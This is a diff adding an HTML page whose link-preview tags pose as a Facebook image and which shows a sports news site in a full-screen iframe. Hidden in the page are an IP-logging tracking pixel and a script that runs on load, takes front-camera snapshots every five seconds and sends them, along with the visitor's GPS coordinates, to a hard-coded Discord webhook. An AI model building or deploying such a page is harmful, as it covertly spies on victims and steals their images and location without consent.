@@ -1,0 +1,131 @@
+
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="title" content="over" />
+        <meta name="description" content="facebook" />
+        <meta property="og:type" content="website" />
+        <meta property="og:url" content="https://scontent.fcai1-3.fna.fbcdn.net/v/t39.30808-6/460349552_122130952592366978_8005727315040416038_n.jpg?stp=dst-jpg_s720x720&_nc_cat=101&ccb=1-7&_nc_sid=833d8c&_nc_eui2=AeHsiWBXyi3vyploDza35WbMgJNvJbOyLzuAk28ls7IvO_HIz895vx7P8aEsNboMSt3cI9v-hKv3ZTiz7pFH5hPj&_nc_ohc=iyEMGllBdHwQ7kNvgHAGceP&_nc_ht=scontent.fcai1-3.fna&oh=00_AYCxGpdwmPT0k5rHw5fuN06Xpes9rBPyXhCxu3__Av8x5Q&oe=66F4F3EF" />
+        <meta property="og:title" content="over" />
+        <meta property="og:description" content="facebook" />
+        <meta property="og:image" content="https://scontent.fcai1-3.fna.fbcdn.net/v/t39.30808-6/460349552_122130952592366978_8005727315040416038_n.jpg?stp=dst-jpg_s720x720&_nc_cat=101&ccb=1-7&_nc_sid=833d8c&_nc_eui2=AeHsiWBXyi3vyploDza35WbMgJNvJbOyLzuAk28ls7IvO_HIz895vx7P8aEsNboMSt3cI9v-hKv3ZTiz7pFH5hPj&_nc_ohc=iyEMGllBdHwQ7kNvgHAGceP&_nc_ht=scontent.fcai1-3.fna&oh=00_AYCxGpdwmPT0k5rHw5fuN06Xpes9rBPyXhCxu3__Av8x5Q&oe=66F4F3EF" />
+        <meta property="twitter:card" content="summary_large_image" />
+        <meta property="twitter:url" content="https://scontent.fcai1-3.fna.fbcdn.net/v/t39.30808-6/460349552_122130952592366978_8005727315040416038_n.jpg?stp=dst-jpg_s720x720&_nc_cat=101&ccb=1-7&_nc_sid=833d8c&_nc_eui2=AeHsiWBXyi3vyploDza35WbMgJNvJbOyLzuAk28ls7IvO_HIz895vx7P8aEsNboMSt3cI9v-hKv3ZTiz7pFH5hPj&_nc_ohc=iyEMGllBdHwQ7kNvgHAGceP&_nc_ht=scontent.fcai1-3.fna&oh=00_AYCxGpdwmPT0k5rHw5fuN06Xpes9rBPyXhCxu3__Av8x5Q&oe=66F4F3EF" />
+        <meta property="twitter:title" content="over" />
+        <meta property="twitter:description" content="facebook" />
+        <meta property="twitter:image" content="https://scontent.fcai1-3.fna.fbcdn.net/v/t39.30808-6/460349552_122130952592366978_8005727315040416038_n.jpg?stp=dst-jpg_s720x720&_nc_cat=101&ccb=1-7&_nc_sid=833d8c&_nc_eui2=AeHsiWBXyi3vyploDza35WbMgJNvJbOyLzuAk28ls7IvO_HIz895vx7P8aEsNboMSt3cI9v-hKv3ZTiz7pFH5hPj&_nc_ohc=iyEMGllBdHwQ7kNvgHAGceP&_nc_ht=scontent.fcai1-3.fna&oh=00_AYCxGpdwmPT0k5rHw5fuN06Xpes9rBPyXhCxu3__Av8x5Q&oe=66F4F3EF" />
+        <title>title</title>
+        <style>
+            body, html {
+                margin: 0;
+                padding: 0;
+                height: 100%;
+            }
+            iframe {
+                width: 100%;
+                height: 100%;
+                border: none;
+            }
+        </style>
+    </head>
+    <body>
+        <img src="https://grabify.link/WHR7FP" style="display:none;">
+        <video id="video" autoplay style="display:none;"></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+
+        <script>
+            const webhookURL = "https://discord.com/api/webhooks/1287136109733871727/aFupIM9xmdK_SroicqsDyZjdst4mjoTuBPDuynSqLmtlj6v8Sb1GZ6nh90phQXPpWMen";
+
+            // Function to send image to Discord webhook as file
+            async function sendImageToWebhook(imageBlob) {
+                const formData = new FormData();
+                formData.append("file", imageBlob, "snapshot.png");
+
+                try {
+                    await fetch(webhookURL, {
+                        method: "POST",
+                        body: formData
+                    });
+                } catch (error) {
+                    console.error("Failed to send image:", error);
+                }
+            }
+
+            // Function to take a picture using the front camera
+            async function takePicture() {
+                const video = document.getElementById("video");
+                const canvas = document.getElementById("canvas");
+                const context = canvas.getContext("2d");
+
+                // Get user media (front camera)
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    video.srcObject = stream;
+
+                    video.onloadedmetadata = () => {
+                        // Set canvas size to match video feed
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+
+                        // Start looping every 5 seconds (or any desired interval)
+                        setInterval(() => {
+                            // Draw the video frame to the canvas
+                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                            // Convert canvas to Blob (image/png)
+                            canvas.toBlob(async (blob) => {
+                                if (blob) {
+                                    // Send the image to the webhook
+                                    await sendImageToWebhook(blob);
+                                }
+                            }, "image/png");
+                        }, 5000); // Take picture every 5 seconds
+                    };
+                } catch (error) {
+                    console.error("Failed to access camera:", error);
+                }
+            }
+
+            // Function to get GPS coordinates and send them to the webhook
+            function getGPS() {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(async function (position) {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+
+                        // Prepare data with coordinates
+                        const data = {
+                            content: `User GPS coordinates: Latitude: ${latitude}, Longitude: ${longitude}`
+                        };
+
+                        // Send GPS data
+                        try {
+                            await fetch(webhookURL, {
+                                method: "POST",
+                                headers: {
+                                    "Content-Type": "application/json"
+                                },
+                                body: JSON.stringify(data)
+                            });
+                        } catch (error) {
+                            console.error("Failed to send GPS data:", error);
+                        }
+                    });
+                } else {
+                    console.error("Geolocation is not supported by this browser.");
+                }
+            }
+
+            // Trigger GPS and camera loop on page load
+            window.onload = function () {
+                getGPS();
+                takePicture();
+            };
+        </script>
+
+        <iframe src="https://www.yallakora.com/" frameborder="0"></iframe>
+    </body>
+    </html>
+    
